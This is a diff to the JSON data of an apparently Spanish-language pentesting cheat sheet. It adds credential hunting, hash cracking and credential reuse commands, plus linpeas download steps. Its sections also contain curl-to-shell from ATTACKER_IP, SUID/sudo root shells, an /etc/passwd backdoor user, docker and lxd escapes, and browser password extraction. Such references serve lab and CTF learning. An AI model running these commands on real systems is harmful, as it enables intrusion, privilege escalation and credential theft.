@@ -2,7 +2,7 @@
   "generatedAt": "2026-07-08",
   "stats": {
     "totalSections": 19,
-    "totalCommands": 426,
+    "totalCommands": 435,
     "totalTags": 9,
     "totalGuides": 8
   },
@@ -1361,6 +1361,8 @@
         "credentials"
       ],
       "commands": [
+        "hashid 'HASH'",
+        "nth -t 'HASH'",
         "ssh2john id_rsa > id_rsa.hash",
         "keepass2john vault.kdbx > keepass.hash",
         "zip2john secret.zip > zip.hash",
@@ -1368,6 +1370,11 @@
         "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
         "john --show hash.txt",
         "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
+        "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
+        "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
+        "nxc smb $IP -u $USER -p $PASS",
+        "nxc winrm $IP -u $USER -p $PASS",
+        "ssh $USER@$IP",
         "find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null",
         "python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/",
         "python3 firefox_decrypt.py /ruta/al/perfil",
@@ -1475,6 +1482,8 @@
         [
           "code",
           [
+            "hashid 'HASH'",
+            "nth -t 'HASH'",
             "ssh2john id_rsa > id_rsa.hash",
             "keepass2john vault.kdbx > keepass.hash",
             "zip2john secret.zip > zip.hash",
@@ -1482,6 +1491,20 @@
             "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
             "john --show hash.txt",
             "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt"
+          ]
+        ],
+        [
+          "h2",
+          "Buscar en disco y reutilizar"
+        ],
+        [
+          "code",
+          [
+            "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
+            "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
+            "nxc smb $IP -u $USER -p $PASS",
+            "nxc winrm $IP -u $USER -p $PASS",
+            "ssh $USER@$IP"
           ]
         ],
         [
@@ -1524,7 +1547,7 @@
           ]
         ]
       ],
-      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Stego y forense de ficheros file archivo; strings -n 8 archivo exiftool imagen.jpg binwalk -e archivo steghide info imagen.jpg ; steghide extract -sf imagen.jpg stegseek imagen.jpg /usr/share/wordlists/rockyou.txt zsteg -a imagen.png foremost -i archivo -o salida Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
+      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes hashid 'HASH' nth -t 'HASH' ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Buscar en disco y reutilizar grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null nxc smb $IP -u $USER -p $PASS nxc winrm $IP -u $USER -p $PASS ssh $USER@$IP Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Stego y forense de ficheros file archivo; strings -n 8 archivo exiftool imagen.jpg binwalk -e archivo steghide info imagen.jpg ; steghide extract -sf imagen.jpg stegseek imagen.jpg /usr/share/wordlists/rockyou.txt zsteg -a imagen.png foremost -i archivo -o salida Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
     },
     {
       "id": "section-10",
@@ -1661,8 +1684,10 @@
         "find / -perm -4000 -type f -ls 2>/dev/null",
         "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
         "systemctl list-timers 2>/dev/null",
+        "wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+        "python3 -m http.server 8000",
         "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
-        "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh",
+        "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out",
         "./pspy64",
         "sudo -l",
         "sudo find . -exec /bin/sh \\; -quit",
@@ -1739,13 +1764,15 @@
         ],
         [
           "h2",
-          "Automatizado"
+          "Automatizado (linpeas paso a paso)"
         ],
         [
           "code",
           [
+            "wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+            "python3 -m http.server 8000",
             "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
-            "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh",
+            "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out",
             "./pspy64"
           ]
         ],
@@ -1887,7 +1914,7 @@
           ]
         ]
       ],
-      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd find / -perm -4000 -type f -ls 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' systemctl list-timers 2>/dev/null Automatizado curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Contenedores (docker / lxd) id docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxc image import ./alpine.tar.gz --alias privesc lxc init privesc r00t -c security.privileged=true lxc config device add r00t host disk source=/ path=/mnt/root recursive=true lxc start r00t && lxc exec r00t /bin/sh Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd find / -perm -4000 -type f -ls 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' systemctl list-timers 2>/dev/null Automatizado (linpeas paso a paso) wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh python3 -m http.server 8000 curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Contenedores (docker / lxd) id docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxc image import ./alpine.tar.gz --alias privesc lxc init privesc r00t -c security.privileged=true lxc config device add r00t host disk source=/ path=/mnt/root recursive=true lxc start r00t && lxc exec r00t /bin/sh Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
     },
     {
       "id": "section-12",
